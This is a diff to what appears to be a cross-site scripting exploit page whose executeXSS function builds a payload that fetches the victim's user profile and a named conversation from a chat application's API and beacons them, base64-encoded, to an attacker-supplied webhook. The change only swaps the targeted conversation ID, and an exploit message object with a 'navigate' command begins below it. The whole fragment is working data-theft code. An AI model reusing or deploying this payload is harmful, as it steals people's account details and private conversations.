@@ -28,7 +28,7 @@
 
         function executeXSS() {
             // fetches full JSON from /users/me and /conversations/[id], bundles them, and beacons them out.
-            var code = `(async()=>{try{var [u,c]=await Promise.all([fetch('/api/users/me').then(r=>r.json()),fetch('/api/conversations/6961496d4575375e9480c7f3').then(r=>r.json())]);var d={user:u,chats:c};navigator.sendBeacon('${webhook}?data='+btoa(JSON.stringify(d)))}catch(e){navigator.sendBeacon('${webhook}?error='+btoa(e.message))}})()`;
+            var code = `(async()=>{try{var [u,c]=await Promise.all([fetch('/api/users/me').then(r=>r.json()),fetch('/api/conversations/695f4cd124eb235aea87a3a4').then(r=>r.json())]);var d={user:u,chats:c};navigator.sendBeacon('${webhook}?data='+btoa(JSON.stringify(d)))}catch(e){navigator.sendBeacon('${webhook}?error='+btoa(e.message))}})()`;
 
             var exploitMessage = {
                 command: "navigate",
